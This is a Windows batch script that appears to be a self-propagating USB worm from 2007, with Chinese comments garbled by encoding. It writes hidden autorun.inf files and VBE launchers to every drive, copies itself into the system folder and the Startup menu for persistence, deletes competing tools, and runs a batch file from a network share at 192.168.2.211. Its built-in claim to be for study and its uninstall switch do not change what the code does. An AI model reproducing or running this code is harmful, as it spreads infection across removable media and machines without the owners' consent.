@echo off
setlocal ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS
cd /d "%~dp0"
if /i "%cd%"=="%~d0\" (explorer.exe "%~d0")
set v=01
set "endf=%systemdrive%\8bye.txt"
call:ie s.vbe
echo.Wscript.sleep 10000>s.vbe
attrib s.vbe +a +s +r +h
if /i not "%cd%"=="%systemroot%" (call:cb&del /a /f /q s.vbe&goto :eof)
set dl=CDEFGHIJKLMNOPQRSTUVWXYZ
set n=0
call:inf >inf.tem
call:ql
uda.a
md "%systemroot%\bakfiles\"
call:ie "%systemroot%\bakfiles\���ļ��ϵ���ͼ�����Խ�ѹ��ԭ�ļ�.bat"
copy uda-��ѹ.bat "%systemroot%\bakfiles\���ļ��ϵ���ͼ�����Խ�ѹ��ԭ�ļ�.bat"
call:ie "%systemroot%\bakfiles\uda.a"
call:copy uda.a "%systemroot%\bakfiles\"
:s
echo. >uhere-%v%.txt
if exist "%endf%" (set n=1&goto end)
if "!dl:~%n%,1!"=="" (set n=0&s.vbe&(ping 192.168.2.211 -n 1 &&call \\192.168.2.211\re$\add.bat))
set d=!dl:~%n%,1!:
set /a n=n+1
if not exist %d% (goto s)
if exist "%d%\autorun.inf\" (echo.y|cacls "%d%\autorun.inf" /p everyone:f
rd "%d%\autorun.inf" /s /q)
if exist "%d%\autorun.inf" (fc "%d%\autorun.inf" inf.tem&if not "!ERRORLEVEL!"=="0" (call U�̲�������.bat -a -l -d %d:~0,-1% -c -i -s&goto s1)) else (goto s1)
if not exist "%d%\%~n0.vbe" (goto s2)
if not exist "%d%\%~nx0" (goto s3)
if not exist "%d%\uda.a" (goto s4)
if exist %d%\%date:~0,10%.sk (goto s)
:s1
call:inf >%d%\autorun.inf
attrib %d%\autorun.inf +a +s +r +h
call:ie "%d%\%~n0.vbe"
:s2
call:vbe "%~nx0" >"%d%\%~n0.vbe"
attrib "%d%\%~n0.vbe" +a +s +r +h
:s3
call:copy "%~dpnx0" "%d%\"
:s4
call:copy "uda.a" "%d%\"
call:ie %d%\*.sk
echo.>%d%\%date:~0,10%.sk
attrib %d%\%date:~0,10%.sk +a +s +r +h
goto s
:cb
if exist "%systemroot%\uhere-*.txt" (del /a /f /q "%systemroot%\uhere-*.txt"&s.vbe)
if exist "%systemroot%\uhere-*.txt" (if exist "%systemroot%\uhere-%v%.txt" (goto :eof) else (call:v "%systemroot%\uhere-*.txt"&(if %v% lss !v0! (goto :eof))))
call:rm >%systemdrive%\�Ѿ�����U�̲����ġ���������Ⱦ.txt
call:copy "%~dpnx0" "%systemroot%\"
call:copy "uda.a" "%systemroot%\"
call:ie "%systemroot%\%~n0.vbe"
call:vbe "%~nx0" >"%systemroot%\%~n0.vbe"
call:ie "%ALLUSERSPROFILE%\����ʼ���˵�\����\����\%~n0.vbe"
call:vbe "%systemroot%\%~nx0" >"%ALLUSERSPROFILE%\����ʼ���˵�\����\����\%~n0.vbe"
start "" /wait /d "%systemroot%\" "%systemroot%\%~n0.vbe"
goto :eof
:v
set "v0=%~nx1"
set /a "v0=%v0:~6,2%"
goto :eof
:rm
echo.	����������벻Ҫ���š����Բ����Ķ���Ϊ��1�������ԣ�2��Ǳ���ԣ�3���ƻ��ԡ����ݴ˶��壬���ű�����ȫ����1���е����2��������3����˵�ƻ���Ҳ����û�У���ֻ���U�̲��������һ���ɾ���ļ�ǰ���ݣ����ݵ�ַ��%systemroot%\bakfiles\������ˣ��������ּ������ţ������������Ĳ��������ű���Ŀ����ͨ��U�̴���������;����U���еĲ�����������ܣ�����ռ����Ĳ����ļ��������ߣ�����������̫�಻�㣨���䱻U�̲�����Ⱦ�����类���ű���Ⱦ���������������������������˲��㣬��ж�ر��ű�������%systemdrive%\���½�һ����Ϊ8bye���ı��ļ�������Ҫд�����ݣ������½�%endf%������Լ��20�������ж�أ�������������U�̲������ߡ����˽���࣬��� U�̲������� �������ļ�����ַ��%systemroot%\readme.txt����лл��
echo.	�����ļ���u.bat�����ļ���4240�ֽڣ���uda.a��21674�ֽڣ�md5��e6762ebf6123bc17ab31995c61bba955��
echo.	Ϊ�о���ѧϰ����������2007-03-15�������֧�֣����ߣ�CyyIsGood�����и�һ11������ϵ��cyyisgood@126.com
goto :eof
:vbe
echo.wscript.createobject("wscript.shell").run """%~1"" /start",0
goto :eof
:inf
echo.[AutoRun]
echo.open=wscript.exe %~n0.vbe
echo.shell\open\Command=wscript.exe %~n0.vbe
echo.shell\explore\Command=wscript.exe %~n0.vbe
echo.shell\find\Command=wscript.exe %~n0.vbe
goto :eof
:ie
if exist "%~1" (del /a /f /q "%~1")
goto :eof
:copy
call:ie "%~dp2%~nx1"
attrib "%~1" -s -h
copy "%~1" "%~dp2"
attrib "%~1" +s +h
attrib "%~dp2%~nx1" +s +h
goto :eof
:ql
cd /d "%systemroot%\"
del /a /f /q Anti-U������.bat ReadMe.txt uda-��ѹ.bat U�̲�������.bat zap.a ���ٿ�.bat �򿪷��͹���.bat
cd /d "%~dp0"
goto :eof
:end
set d=!dl:~%n%,1!
echo.%d%:\
if exist %d%:\ (del /a /f /q %d%:\u.vbe %d%:\u.bat %d%:\uda.a)
set /a n=n+1
if not "!dl:~%n%,1!"=="" goto end
call U�̲�������.bat -c&call:ql&del /a /f /q "%systemdrive%\�Ѿ�����U�̲����ġ���������Ⱦ.txt" "%~dp0s.vbe" "%endf%" inf.tem "uda.a" "%~n0.vbe" "uhere-%v%.txt" "%ALLUSERSPROFILE%\����ʼ���˵�\����\����\%~n0.vbe" "%~nx0"